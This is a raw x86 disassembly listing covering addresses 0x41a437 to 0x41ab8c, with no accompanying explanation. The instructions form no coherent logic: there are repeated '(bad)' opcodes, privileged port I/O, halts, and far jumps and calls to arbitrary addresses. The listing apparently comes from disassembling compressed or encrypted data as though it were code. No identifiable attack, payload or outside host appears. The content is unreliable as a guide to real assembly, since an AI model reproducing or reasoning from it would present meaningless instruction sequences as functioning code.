  41a437:	sub    edi,DWORD PTR [ecx]
  41a439:	mov    ebp,DWORD PTR [ebx-0x4c]
  41a43c:	adc    dl,BYTE PTR [ecx-0x27]
  41a43f:	addr16 push 0x67
  41a442:	mov    ebx,0x95d8df11
  41a447:	test   eax,0xa28de6fa
  41a44c:	mov    edi,0x796644e3
  41a451:	pop    es
  41a452:	out    dx,al
  41a453:	int3   
  41a454:	and    al,0xce
  41a456:	iret   
  41a457:	fwait
  41a458:	xchg   ecx,eax
  41a459:	dec    ecx
  41a45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a45b:	mov    dh,0x85
  41a45d:	xchg   edx,eax
  41a45e:	retf   
  41a45f:	neg    esi
  41a461:	push   ss
  41a462:	call   0x520690ea
  41a467:	push   0x6e1375d2
  41a46c:	push   ds
  41a46d:	int    0xa8
  41a46f:	sub    esi,DWORD PTR [ecx+0x7c]
  41a472:	arpl   WORD PTR [edx],sp
  41a474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a475:	rcl    BYTE PTR [esi],cl
  41a477:	add    DWORD PTR [ebp+0x6b],0x5e
  41a47b:	retf   0xb2a9
  41a47e:	inc    esp
  41a47f:	rcr    bl,0x7e
  41a482:	neg    DWORD PTR ds:0xfe8bc3b0
  41a488:	loopne 0x41a425
  41a48a:	fwait
  41a48b:	test   al,0x71
  41a48d:	inc    esp
  41a48e:	adc    eax,0xfa809619
  41a493:	jl     0x41a4e9
  41a495:	jecxz  0x41a47f
  41a497:	cmp    eax,0x35f4db77
  41a49c:	jmp    0x41a4c9
  41a49e:	add    edi,0x68
  41a4a1:	in     eax,dx
  41a4a2:	adc    BYTE PTR [ebx+0x5e],ah
  41a4a5:	icebp  
  41a4a6:	je     0x41a434
  41a4a8:	adc    ch,0x7c
  41a4ab:	push   0xffffffd1
  41a4ad:	xor    DWORD PTR [edi],esp
  41a4af:	sub    esi,esp
  41a4b1:	scas   eax,DWORD PTR es:[edi]
  41a4b2:	xor    esi,DWORD PTR [edx+0x7]
  41a4b5:	pop    edx
  41a4b6:	loopne 0x41a45b
  41a4b8:	push   0xe271047
  41a4bd:	outs   dx,BYTE PTR ds:[esi]
  41a4be:	add    al,0x57
  41a4c0:	fild   WORD PTR [esi+edi*8-0xe]
  41a4c4:	pop    ebx
  41a4c5:	fimul  WORD PTR [eax+0x78]
  41a4c8:	test   al,0xa3
  41a4ca:	push   0x2c6d7643
  41a4cf:	in     al,dx
  41a4d0:	ffree  st(3)
  41a4d2:	push   0x50e0ce15
  41a4d7:	ds inc ebx
  41a4d9:	popa   
  41a4da:	data16 hlt 
  41a4dc:	push   ebp
  41a4dd:	dec    esi
  41a4de:	ss (bad) 
  41a4e0:	jae    0x41a50e
  41a4e2:	inc    esp
  41a4e3:	dec    edi
  41a4e4:	sub    BYTE PTR [ebx],bh
  41a4e6:	jne    0x41a4fd
  41a4e8:	mov    DWORD PTR [edi-0x45502bf9],0x71767583
  41a4f2:	jle    0x41a55b
  41a4f4:	mov    bl,0xd4
  41a4f6:	or     eax,0x6b491121
  41a4fb:	xchg   edx,eax
  41a4fc:	cmp    BYTE PTR [edi-0x65],ch
  41a4ff:	fist   WORD PTR [edi-0x4f]
  41a502:	pop    ecx
  41a503:	xor    eax,0xf4d56248
  41a508:	(bad)  
  41a509:	(bad)  
  41a50a:	aad    0x15
  41a50c:	out    0x58,eax
  41a50e:	arpl   WORD PTR [edi],ax
  41a510:	add    esp,eax
  41a512:	push   eax
  41a513:	dec    ebp
  41a514:	cmp    eax,0x2e8d20bf
  41a519:	in     eax,dx
  41a51a:	dec    ebx
  41a51b:	sub    edi,edi
  41a51d:	hlt    
  41a51e:	dec    esp
  41a51f:	loopne 0x41a573
  41a521:	xchg   edi,eax
  41a522:	mov    ds:0x54ad53bf,al
  41a527:	std    
  41a528:	addr16 sub bh,ah
  41a52b:	rcr    DWORD PTR [ecx-0x5ec1701a],1
  41a531:	sbb    al,0xb4
  41a533:	jno    0x41a54d
  41a535:	pop    edi
  41a536:	xchg   esi,eax
  41a537:	aaa    
  41a538:	mov    bh,bh
  41a53a:	or     DWORD PTR [esi],edi
  41a53c:	jnp    0x41a589
  41a53e:	adc    al,0x1c
  41a540:	popa   
  41a541:	add    esp,DWORD PTR [esp+ebp*8-0x3b]
  41a545:	iret   
  41a546:	addr16 pop edx
  41a548:	test   DWORD PTR [edx],eax
  41a54a:	xor    edi,DWORD PTR [edx-0x1fc9fc63]
  41a550:	cmp    BYTE PTR [si-0x6c0b],cl
  41a555:	stc    
  41a556:	xchg   edi,eax
  41a557:	je     0x41a517
  41a559:	cmp    ah,BYTE PTR [esi+ecx*4]
  41a55c:	adc    ch,BYTE PTR [ecx-0x8]
  41a55f:	shl    BYTE PTR [ecx],0x55
  41a562:	sbb    eax,ebp
  41a564:	inc    ebp
  41a565:	or     eax,0x30dc1320
  41a56a:	loope  0x41a4f1
  41a56c:	test   BYTE PTR [eax],dh
  41a56e:	out    0xcd,al
  41a570:	out    dx,eax
  41a571:	push   cs
  41a572:	mov    ss,WORD PTR [ebx+0x3eb9f2ee]
  41a578:	int3   
  41a579:	lods   eax,DWORD PTR ds:[esi]
  41a57a:	xor    al,0x59
  41a57c:	fs in  al,0xe1
  41a57f:	ret    
  41a580:	xchg   edx,eax
  41a581:	sub    eax,0x9432d209
  41a586:	int    0xdf
  41a588:	xchg   edx,eax
  41a589:	push   0x53
  41a58b:	cmp    DWORD PTR [eax-0x2a],ebx
  41a58e:	out    0xe8,al
  41a590:	jo     0x41a5f3
  41a592:	dec    edi
  41a593:	xchg   BYTE PTR [edi+esi*1-0x3f],ch
  41a597:	cmp    bh,BYTE PTR [ecx+0x24]
  41a59a:	pop    ebx
  41a59b:	sbb    eax,0xd0241b7e
  41a5a0:	add    al,0x14
  41a5a2:	inc    edi
  41a5a4:	popa   
  41a5a5:	outs   dx,BYTE PTR ds:[esi]
  41a5a6:	cmp    dl,BYTE PTR cs:[ebp-0x20]
  41a5aa:	ds inc ebp
  41a5ac:	push   ebx
  41a5ad:	mov    ebx,0x2feaca56
  41a5b2:	sbb    eax,0x9accb0a
  41a5b7:	fimul  DWORD PTR [ecx]
  41a5b9:	icebp  
  41a5ba:	push   ds
  41a5bb:	push   cs
  41a5bc:	mov    ecx,ebx
  41a5be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5bf:	rcr    DWORD PTR [eax-0x44],1
  41a5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5c3:	and    dh,BYTE PTR [edx+0x60]
  41a5c6:	cmp    ebp,DWORD PTR [ebp+0x61]
  41a5c9:	cmp    dl,BYTE PTR [esi-0x31]
  41a5cc:	imul   BYTE PTR [ebx]
  41a5ce:	adc    edi,DWORD PTR [esi]
  41a5d0:	fucom  st(5)
  41a5d2:	sbb    bh,dl
  41a5d4:	xchg   al,bh
  41a5d6:	gs mov ebp,0x7066e15d
  41a5dc:	aam    0x5
  41a5de:	pop    ecx
  41a5df:	imul   eax,DWORD PTR [edi+0xae56758],0xa3711ed7
  41a5e9:	jp     0x41a62e
  41a5eb:	addr16 xor al,0xfd
  41a5ee:	popf   
  41a5ef:	retf   0xa7ef
  41a5f2:	cwde   
  41a5f3:	adc    eax,0xc8b609fa
  41a5f8:	arpl   WORD PTR [esi+esi*4-0x78],ax
  41a5fc:	jmp    0xd3cc:0xf16a888b
  41a603:	mov    dh,0xbe
  41a605:	dec    esp
  41a606:	jl     0x41a599
  41a608:	mov    DWORD PTR [ebx+0x79d34f0d],ebx
  41a60e:	dec    esi
  41a60f:	cmp    al,0x51
  41a611:	sbb    ah,BYTE PTR [ebp+0x4]
  41a614:	pop    DWORD PTR [esi+0x2181f50a]
  41a61a:	sbb    DWORD PTR [edx+0xb],ebp
  41a61d:	lahf   
  41a61e:	push   0x21
  41a620:	test   bl,dl
  41a622:	xchg   esi,eax
  41a623:	cwde   
  41a624:	jnp    0x41a63e
  41a626:	lods   eax,DWORD PTR ds:[esi]
  41a627:	std    
  41a628:	aas    
  41a629:	(bad)  
  41a62a:	div    DWORD PTR [eax-0x78]
  41a62d:	not    BYTE PTR [eax-0x53]
  41a630:	add    eax,0x57a48e29
  41a635:	mov    dh,0x9d
  41a637:	xchg   esi,eax
  41a638:	sahf   
  41a639:	fdivp  st(4),st
  41a63b:	mov    ebp,0x96b5452d
  41a640:	push   ebp
  41a641:	dec    edi
  41a642:	add    BYTE PTR ss:[ebx+0x68fa132f],cl
  41a649:	loopne 0x41a687
  41a64b:	jnp    0x41a6a0
  41a64d:	aam    0x34
  41a64f:	inc    edi
  41a650:	aas    
  41a651:	mov    bl,0x55
  41a653:	dec    esi
  41a654:	call   0x61177464
  41a659:	(bad)  [edi]
  41a65b:	sbb    al,0x3
  41a65d:	mov    DWORD PTR [ecx+0x61],edi
  41a660:	out    0xe0,al
  41a662:	xor    eax,ebx
  41a664:	rcr    ecx,0x28
  41a667:	ins    DWORD PTR es:[edi],dx
  41a668:	lods   eax,DWORD PTR ds:[esi]
  41a669:	jne    0x41a67c
  41a66b:	pusha  
  41a66c:	pop    ds
  41a66d:	inc    edx
  41a66e:	arpl   WORD PTR [esi],dx
  41a670:	stos   DWORD PTR es:[edi],eax
  41a671:	clc    
  41a672:	repz sub BYTE PTR [eax-0x18cad6b0],al
  41a679:	push   cs
  41a67a:	shl    BYTE PTR [ebp+0xf7fba59],1
  41a680:	lods   eax,DWORD PTR ds:[esi]
  41a681:	rcl    BYTE PTR [edi],1
  41a683:	jns    0x41a6fb
  41a685:	xlat   BYTE PTR ds:[ebx]
  41a686:	pop    es
  41a687:	sbb    eax,0xd9d51e83
  41a68c:	dec    edx
  41a68d:	xor    al,0xbd
  41a68f:	pushf  
  41a690:	push   0x61
  41a692:	in     al,dx
  41a693:	xchg   esp,eax
  41a694:	outs   dx,BYTE PTR ds:[esi]
  41a695:	jo     0x41a6bf
  41a697:	sub    eax,0xdfa3d668
  41a69c:	jmp    0x85290be1
  41a6a1:	popf   
  41a6a2:	jbe    0x41a651
  41a6a4:	xor    cl,BYTE PTR [edx]
  41a6a6:	dec    ebx
  41a6a7:	mov    ds:0x2b64505,al
  41a6ac:	fstp   TBYTE PTR [eax-0x1e128c93]
  41a6b2:	inc    eax
  41a6b3:	jmp    edx
  41a6b5:	(bad)  
  41a6b6:	rol    BYTE PTR ds:0x2cac75ce,1
  41a6bc:	mov    ecx,0xb91f6e2e
  41a6c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6c2:	jecxz  0x41a646
  41a6c4:	mov    ebx,0x208bc9de
  41a6c9:	ss xchg edx,eax
  41a6cb:	push   cs
  41a6cc:	ror    DWORD PTR [edi+0xf],1
  41a6cf:	add    eax,0xa1cfa788
  41a6d4:	lea    edi,[edi+0x48]
  41a6d7:	mov    edi,0x3189f627
  41a6dc:	aad    0x2
  41a6de:	cmp    DWORD PTR [edx-0x22],0x5600360d
  41a6e5:	test   BYTE PTR [eax],ah
  41a6e7:	(bad)  
  41a6e8:	rcl    DWORD PTR [edi+esi*1-0x37],1
  41a6ec:	ret    
  41a6ed:	or     DWORD PTR [esi+0x2d65db08],edi
  41a6f3:	sahf   
  41a6f4:	cmp    esi,edx
  41a6f6:	repz sbb BYTE PTR [esi+edi*1],ch
  41a6fa:	loopne 0x41a77b
  41a6fc:	xchg   esp,eax
  41a6fd:	push   edi
  41a6fe:	btc    DWORD PTR [edi+0x67],esp
  41a702:	out    0x61,eax
  41a704:	pop    eax
  41a705:	cmp    esp,ebp
  41a707:	and    dh,BYTE PTR [ecx]
  41a709:	and    ah,BYTE PTR [edi]
  41a70b:	std    
  41a70c:	cli    
  41a70d:	aas    
  41a70e:	sbb    esp,DWORD PTR [edi-0x3143b817]
  41a714:	xchg   esp,eax
  41a715:	lsl    ebp,WORD PTR [eax+0xceb36b3]
  41a71c:	inc    ecx
  41a71d:	fisttp DWORD PTR es:[eax+edi*2]
  41a721:	or     ecx,DWORD PTR [eax-0x35]
  41a724:	and    eax,0xa5b6c236
  41a729:	in     eax,0x42
  41a72b:	pop    es
  41a72c:	jmp    0x41a794
  41a72e:	xchg   edx,eax
  41a72f:	test   eax,0x75b55921
  41a734:	idiv   DWORD PTR [eax]
  41a736:	cmp    al,0xdd
  41a738:	add    BYTE PTR [esi-0x1b486dde],dl
  41a73e:	jnp    0x41a754
  41a740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a741:	mov    esi,0x5d51338a
  41a746:	(bad)  
  41a747:	jle    0x41a785
  41a749:	mov    edi,0xcd811715
  41a74e:	cwde   
  41a74f:	mov    al,0x47
  41a751:	enter  0x867a,0xf0
  41a755:	in     eax,dx
  41a756:	adc    DWORD PTR [edi+0x5c0a4c79],eax
  41a75c:	stos   DWORD PTR es:[edi],eax
  41a75d:	xchg   edi,eax
  41a75e:	sbb    cl,BYTE PTR [esi+ebx*1]
  41a761:	dec    ecx
  41a762:	dec    ebx
  41a763:	cmp    DWORD PTR [edx-0x1515219c],0x2b
  41a76a:	ror    DWORD PTR [edx],0x7f
  41a76d:	imul   eax,DWORD PTR [ebp-0x34],0x793dfe07
  41a774:	or     ch,ah
  41a776:	xchg   ebp,eax
  41a777:	std    
  41a778:	push   eax
  41a779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a77a:	(bad)  
  41a77b:	out    0x40,al
  41a77d:	cmp    esp,DWORD PTR [ebp+0x78145b09]
  41a783:	inc    ecx
  41a784:	jle    0x41a7ae
  41a786:	inc    ebx
  41a787:	sbb    DWORD PTR [esi],0xffffffac
  41a78a:	jle    0x41a7cc
  41a78c:	xor    eax,0x70f4ce90
  41a791:	xor    edx,DWORD PTR [edx]
  41a793:	xlat   BYTE PTR gs:[ebx]
  41a795:	or     dl,BYTE PTR [eax+0x39]
  41a798:	xchg   edx,eax
  41a799:	sahf   
  41a79a:	push   es
  41a79b:	(bad)  
  41a79c:	out    0x64,eax
  41a79e:	cld    
  41a79f:	pop    edx
  41a7a0:	cmovg  ecx,DWORD PTR [esi-0x69]
  41a7a4:	stos   DWORD PTR es:[edi],eax
  41a7a5:	push   DWORD PTR [edi+0x1628cc84]
  41a7ab:	xchg   ebx,eax
  41a7ac:	outs   dx,DWORD PTR ds:[esi]
  41a7ad:	jg     0x41a74a
  41a7af:	lock sbb DWORD PTR [ebx-0x60ee8ade],esp
  41a7b6:	mov    eax,ds:0x83d24bd6
  41a7bb:	and    dl,BYTE PTR [esp+ebx*8+0x4f677035]
  41a7c2:	sbb    BYTE PTR [ecx],0x91
  41a7c5:	push   eax
  41a7c6:	mov    esp,0xe2087829
  41a7cb:	cld    
  41a7cc:	js     0x41a7dd
  41a7ce:	pop    ecx
  41a7cf:	icebp  
  41a7d0:	cmc    
  41a7d1:	xlat   BYTE PTR ds:[ebx]
  41a7d2:	mov    bh,0x69
  41a7d4:	out    dx,al
  41a7d5:	push   es
  41a7d6:	sti    
  41a7d7:	cdq    
  41a7d8:	cmp    DWORD PTR [edi-0x2e],esp
  41a7db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7dc:	mov    edx,0x2f32abb3
  41a7e1:	pop    edx
  41a7e2:	cld    
  41a7e3:	test   eax,0x4707d6ff
  41a7e8:	jo     0x41a85c
  41a7ea:	cmp    eax,0x7f6f5c7f
  41a7ef:	retf   
  41a7f0:	(bad)  
  41a7f1:	mov    dl,cl
  41a7f3:	data16 fwait
  41a7f5:	lahf   
  41a7f6:	ss (bad) 
  41a7f8:	inc    ebp
  41a7f9:	out    0xe7,eax
  41a7fb:	jne    0x41a791
  41a7fd:	xor    al,bl
  41a7ff:	sub    al,0x26
  41a801:	xchg   edx,eax
  41a802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a803:	mov    esp,0xcff361ea
  41a808:	or     eax,DWORD PTR [ecx]
  41a80a:	and    BYTE PTR [ebx+0xd825cc1],ah
  41a810:	push   ebx
  41a811:	cli    
  41a812:	imul   DWORD PTR [edx+0x22895b13]
  41a818:	std    
  41a819:	add    DWORD PTR [ebx-0x7b349c27],esp
  41a81f:	add    DWORD PTR [eax+0x4ca502b9],edi
  41a825:	rcr    BYTE PTR [edi+eiz*2-0x46],cl
  41a829:	shr    bl,0x74
  41a82c:	repz bound esi,QWORD PTR ds:0x5516502c
  41a833:	mov    ecx,0x264d00eb
  41a838:	das    
  41a839:	jl     0x41a87f
  41a83b:	retf   
  41a83c:	fneni(8087 only) 
  41a83e:	pop    edx
  41a83f:	xchg   BYTE PTR [ebp+0x122ddf16],al
  41a845:	in     eax,dx
  41a846:	add    esp,DWORD PTR [ecx-0x7e1677eb]
  41a84c:	mov    dl,0x44
  41a84e:	test   al,0x87
  41a850:	je     0x41a852
  41a852:	mov    ebp,DWORD PTR ds:[edx+0xb]
  41a856:	jae    0x41a881
  41a858:	dec    BYTE PTR ds:0x16badfd
  41a85e:	jp     0x41a8a8
  41a860:	test   al,0x16
  41a862:	jnp    0x41a8e0
  41a864:	sbb    BYTE PTR [ebx+0x25091940],ch
  41a86a:	jbe    0x41a8b8
  41a86c:	nop
  41a86d:	shr    DWORD PTR [esi],cl
  41a86f:	xchg   esp,eax
  41a870:	sbb    BYTE PTR [edx],dl
  41a872:	lea    edx,[edx-0x4bfab0d5]
  41a878:	adc    DWORD PTR [ecx-0x69],ebp
  41a87b:	push   ebp
  41a87c:	xchg   ecx,eax
  41a87d:	pop    esi
  41a87e:	or     DWORD PTR [edx-0x392bfad0],0x229c6f62
  41a888:	retf   0xe95e
  41a88b:	push   ds
  41a88c:	mov    bh,0xa6
  41a88e:	test   al,0xf9
  41a890:	imul   ebp,DWORD PTR [ebx],0xffffff8b
  41a893:	call   0x5b9dd0ab
  41a898:	inc    edx
  41a899:	adc    eax,DWORD PTR [esi+ebx*1+0x6bc8a6cb]
  41a8a0:	pop    ecx
  41a8a1:	sbb    ah,BYTE PTR [eax+0x66c46c74]
  41a8a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8a8:	ins    DWORD PTR es:[edi],dx
  41a8a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8aa:	mov    esp,0xb772e325
  41a8af:	int    0xbd
  41a8b1:	mov    ecx,0xb530a122
  41a8b6:	xchg   ebx,eax
  41a8b7:	pushf  
  41a8b8:	push   cs
  41a8b9:	loop   0x41a86f
  41a8bb:	add    al,BYTE PTR [ecx-0x58]
  41a8be:	ret    0xe37e
  41a8c1:	add    BYTE PTR [esi+0x1d95ed79],dl
  41a8c7:	and    DWORD PTR [edx],ecx
  41a8c9:	xchg   ebp,eax
  41a8ca:	repz cmp al,0x1f
  41a8cd:	fld    QWORD PTR [ecx+0x1]
  41a8d0:	mov    WORD PTR [ebx],?
  41a8d2:	(bad)  
  41a8d3:	and    DWORD PTR [ebx-0x1],esp
  41a8d6:	push   ss
  41a8d7:	(bad)  
  41a8d8:	and    dh,ah
  41a8da:	js     0x41a93a
  41a8dc:	dec    ebx
  41a8dd:	shl    ch,cl
  41a8df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8e1:	popf   
  41a8e2:	outs   dx,DWORD PTR ds:[esi]
  41a8e3:	rcl    DWORD PTR [ecx+0x721020f6],0x75
  41a8ea:	pop    ebp
  41a8eb:	jo     0x41a8cb
  41a8ed:	and    esi,DWORD PTR [ebx+0x67]
  41a8f0:	clc    
  41a8f1:	jae    0x41a924
  41a8f3:	add    ch,BYTE PTR [ecx+0x5d45e046]
  41a8f9:	retf   
  41a8fa:	in     eax,dx
  41a8fb:	test   BYTE PTR [edx+0x64],0xfe
  41a8ff:	cmp    ch,BYTE PTR [edx+0x29]
  41a902:	adc    DWORD PTR [ebx+edx*8+0x22],0x7f318de3
  41a90a:	push   edi
  41a90b:	lods   al,BYTE PTR ds:[esi]
  41a90c:	mov    esi,0x34f4a401
  41a911:	mov    ecx,0x2a0d9c72
  41a916:	xchg   ecx,eax
  41a917:	or     ah,ah
  41a919:	test   BYTE PTR [edx],dl
  41a91b:	rcl    BYTE PTR [esi-0xa76d869],0x53
  41a922:	inc    esi
  41a923:	push   cs
  41a924:	shl    BYTE PTR [ebp-0x50],cl
  41a927:	xchg   dh,ch
  41a929:	jle    0x41a985
  41a92b:	ins    DWORD PTR es:[edi],dx
  41a92c:	and    al,0xce
  41a92e:	mov    eax,0x80b3d19c
  41a933:	inc    edi
  41a934:	shr    ebp,1
  41a936:	mov    ch,0xf8
  41a938:	cli    
  41a939:	sbb    BYTE PTR [ebx+0x3a],ah
  41a93c:	sti    
  41a93d:	pop    edi
  41a93e:	cdq    
  41a93f:	(bad)  
  41a940:	jge    0x41a9bc
  41a942:	jmp    0x41a914
  41a944:	or     al,BYTE PTR [ecx+0x192811fc]
  41a94a:	cdq    
  41a94b:	sbb    DWORD PTR fs:[esi-0x24],ebx
  41a94f:	shl    bh,0x18
  41a952:	or     BYTE PTR [eax],cl
  41a954:	outs   dx,DWORD PTR ds:[esi]
  41a955:	pop    ebp
  41a956:	pop    es
  41a957:	loop   0x41a9c9
  41a959:	std    
  41a95a:	repnz sahf 
  41a95c:	(bad)  
  41a95d:	rcl    DWORD PTR [ebx+eiz*2+0x63f90c0c],cl
  41a964:	mov    BYTE PTR [eax-0x64],bl
  41a967:	aam    0xf
  41a969:	repnz outs dx,DWORD PTR ds:[esi]
  41a96b:	repz arpl si,dx
  41a96e:	cmp    al,0x32
  41a970:	iret   
  41a971:	sahf   
  41a972:	(bad)  
  41a973:	in     al,dx
  41a974:	and    ch,BYTE PTR [esi]
  41a976:	pop    edi
  41a977:	arpl   sp,sp
  41a979:	pop    edi
  41a97a:	mov    ecx,0x58cf8fbc
  41a97f:	stos   DWORD PTR es:[edi],eax
  41a980:	xchg   BYTE PTR [edi-0x671af37f],ah
  41a986:	jle    0x41a929
  41a988:	pop    ds
  41a989:	and    eax,0x3940c52a
  41a98e:	cmp    BYTE PTR [ebp+0x25],bl
  41a991:	mov    eax,ds:0x31e7c0e1
  41a996:	inc    esp
  41a997:	or     BYTE PTR [esi-0x11],0x93
  41a99b:	(bad)  
  41a99d:	out    0x93,eax
  41a99f:	sub    DWORD PTR [eax],ebx
  41a9a1:	pop    es
  41a9a2:	adc    eax,0xf53e70de
  41a9a7:	xchg   ebp,eax
  41a9a8:	adc    BYTE PTR [ecx+ebp*2+0x26468ef6],0x2
  41a9b0:	mov    al,0x9
  41a9b2:	(bad)  
  41a9b3:	aad    0x26
  41a9b5:	and    eax,0xb6fd2f7d
  41a9ba:	push   ebx
  41a9bb:	xor    al,0x6b
  41a9bd:	into   
  41a9be:	(bad)  [edi+0x490cd935]
  41a9c4:	(bad)  
  41a9c5:	pop    ecx
  41a9c6:	dec    ecx
  41a9c7:	stos   BYTE PTR es:[edi],al
  41a9c8:	pop    ebx
  41a9c9:	add    bl,dh
  41a9cb:	or     al,BYTE PTR ds:[edi+0xbe273f9]
  41a9d2:	shr    BYTE PTR [si+0x60],cl
  41a9d6:	cld    
  41a9d7:	data16 sub al,ah
  41a9da:	pop    ds
  41a9db:	sub    DWORD PTR es:[edx+0x22bb1cd2],0x49
  41a9e3:	mov    bl,0xd4
  41a9e5:	out    dx,eax
  41a9e6:	pop    ebx
  41a9e7:	test   eax,0x5a239e39
  41a9ec:	test   al,0xb3
  41a9ee:	mov    bh,0xd8
  41a9f0:	inc    eax
  41a9f1:	xchg   di,ax
  41a9f3:	sbb    bh,bl
  41a9f5:	sbb    bl,BYTE PTR [esi+0x0]
  41a9f8:	adc    eax,0x456adb8e
  41a9fd:	push   edi
  41a9fe:	(bad)  
  41a9ff:	(bad)
  41aa03:	jmp    0x559e:0x1985618d
  41aa0a:	test   al,0x2b
  41aa0c:	in     eax,dx
  41aa0d:	pop    esp
  41aa0e:	gs inc esi
  41aa10:	ret    
  41aa11:	out    dx,al
  41aa12:	pop    ebx
  41aa13:	mov    dh,0xc8
  41aa15:	int    0x86
  41aa17:	cmp    DWORD PTR [ebx+0x204ed58f],0x6f
  41aa1e:	ins    BYTE PTR es:[edi],dx
  41aa1f:	cdq    
  41aa20:	cmc    
  41aa21:	push   eax
  41aa22:	mov    bh,BYTE PTR [eax+0x62]
  41aa25:	xchg   edx,eax
  41aa26:	push   0x72
  41aa28:	jle    0x41aa23
  41aa2a:	xchg   esi,eax
  41aa2b:	xor    eax,DWORD PTR [esi]
  41aa2d:	in     al,dx
  41aa2e:	scas   eax,DWORD PTR es:[edi]
  41aa2f:	mov    dh,BYTE PTR [ebp+0x3c48133b]
  41aa35:	in     al,dx
  41aa36:	add    DWORD PTR [ecx-0x3],edx
  41aa39:	std    
  41aa3a:	push   ss
  41aa3b:	es mov ebx,0xcf6a7d60
  41aa41:	lods   eax,DWORD PTR ds:[esi]
  41aa42:	outs   dx,BYTE PTR ds:[esi]
  41aa43:	add    BYTE PTR [esi],0x7e
  41aa46:	in     eax,0x37
  41aa48:	neg    DWORD PTR [ebx+0x13e59f27]
  41aa4e:	enter  0x888d,0x24
  41aa52:	push   ds
  41aa53:	add    eax,0xc4c7a4c5
  41aa58:	out    dx,eax
  41aa59:	pushf  
  41aa5a:	mov    ds:0x6b5c633a,al
  41aa5f:	sbb    al,0x13
  41aa61:	add    al,0x57
  41aa63:	lods   eax,DWORD PTR ds:[esi]
  41aa64:	mov    ebp,0xf59719f1
  41aa69:	xchg   ecx,eax
  41aa6a:	sahf   
  41aa6b:	and    eax,0xec1b4399
  41aa70:	shl    BYTE PTR [esi-0x3b],cl
  41aa73:	cmp    dl,BYTE PTR [edi-0x83b7aef]
  41aa79:	mov    esp,0xe94faa6f
  41aa7e:	outs   dx,BYTE PTR ds:[esi]
  41aa7f:	shl    DWORD PTR [ecx+0x78bc5f7b],cl
  41aa85:	mov    DWORD PTR [esi-0x2a],0xbb613506
  41aa8c:	mov    esp,0x1997eff
  41aa91:	xchg   edx,eax
  41aa92:	ins    BYTE PTR es:[edi],dx
  41aa93:	inc    esp
  41aa94:	xchg   BYTE PTR ds:0xbb8d10d1,dl
  41aa9a:	icebp  
  41aa9b:	(bad)  
  41aa9c:	add    eax,0x9013ee07
  41aaa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaa2:	out    dx,eax
  41aaa3:	test   eax,0x57867bb9
  41aaa8:	mov    al,0xb6
  41aaaa:	xor    al,0x4f
  41aaac:	xor    DWORD PTR [ebx+eax*8],ebx
  41aaaf:	xchg   ecx,eax
  41aab0:	mov    eax,0x2c085a94
  41aab5:	cld    
  41aab6:	mov    WORD PTR [edx],?
  41aab8:	sub    ecx,DWORD PTR [ebp+esi*8-0x78]
  41aabc:	mov    dh,0x81
  41aabe:	std    
  41aabf:	xor    al,0x18
  41aac1:	js     0x41aaac
  41aac3:	pop    ss
  41aac4:	pop    ebp
  41aac5:	sbb    DWORD PTR [edi+0xc4ef083],edi
  41aacb:	inc    ebx
  41aacc:	aaa    
  41aacd:	push   ecx
  41aace:	or     eax,0x9d9c0a74
  41aad3:	(bad)  
  41aad4:	out    dx,al
  41aad5:	xchg   ebx,eax
  41aad6:	dec    edx
  41aad7:	mov    esp,0x1e034627
  41aadc:	xor    al,0xef
  41aade:	mov    BYTE PTR [esi+0x183fc34c],ah
  41aae4:	fst    DWORD PTR [edx-0x61]
  41aae7:	push   ebx
  41aae8:	xchg   esi,eax
  41aae9:	mov    edi,0x51218483
  41aaee:	push   ebx
  41aaef:	cdq    
  41aaf0:	popa   
  41aaf1:	dec    edx
  41aaf2:	fild   WORD PTR [ebp-0x4f2fce3d]
  41aaf8:	retf   
  41aaf9:	in     eax,0xc9
  41aafb:	ins    DWORD PTR es:[edi],dx
  41aafc:	jecxz  0x41ab44
  41aafe:	bound  esi,QWORD PTR [ecx+0x436b603d]
  41ab04:	gs sub al,0x46
  41ab07:	pusha  
  41ab08:	(bad)
  41ab0d:	fsubp  st(2),st
  41ab0f:	mov    esp,0x54220190
  41ab14:	bound  ebx,QWORD PTR ds:0x8ecf9bfd
  41ab1a:	enter  0xe283,0xa1
  41ab1e:	pop    esp
  41ab1f:	jmp    0xd79f:0xae283df7
  41ab26:	shl    DWORD PTR [edi-0x641dd568],0x71
  41ab2d:	or     al,0x9a
  41ab2f:	jl     0x41ab5d
  41ab31:	sub    ch,BYTE PTR cs:[ebx+0x2fc9941e]
  41ab38:	pop    edx
  41ab39:	adc    eax,0x14bb0932
  41ab3e:	jg     0x41abb9
  41ab40:	cwde   
  41ab41:	sub    ebx,edx
  41ab43:	xchg   ecx,eax
  41ab44:	adc    BYTE PTR [esp+edi*1],ch
  41ab47:	or     edx,DWORD PTR [edi+0x1c7b8f2a]
  41ab4d:	sub    ebx,0x37
  41ab50:	aad    0x3b
  41ab52:	push   0xfffffffe
  41ab54:	jge    0x41ab4f
  41ab56:	and    DWORD PTR [ebp-0x43409fb6],edi
  41ab5c:	or     edi,esi
  41ab5e:	pop    ebx
  41ab5f:	pop    eax
  41ab60:	cld    
  41ab61:	xchg   ebx,eax
  41ab62:	dec    esp
  41ab63:	add    al,0x4a
  41ab65:	shl    BYTE PTR [esi-0x21a70b8e],0x76
  41ab6c:	ss jo  0x41ab36
  41ab6f:	push   esp
  41ab70:	inc    esi
  41ab71:	scas   al,BYTE PTR es:[edi]
  41ab72:	mov    edx,0x96cc0384
  41ab77:	(bad)  
  41ab79:	lods   al,BYTE PTR ds:[esi]
  41ab7a:	mov    esi,0x84675380
  41ab7f:	jne    0x41ab05
  41ab81:	and    DWORD PTR [ecx+eiz*8-0x29],eax
  41ab85:	jnp    0x41abfb
  41ab87:	shr    BYTE PTR [edi-0x36],0x97
  41ab8b:	inc    edi
  41ab8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
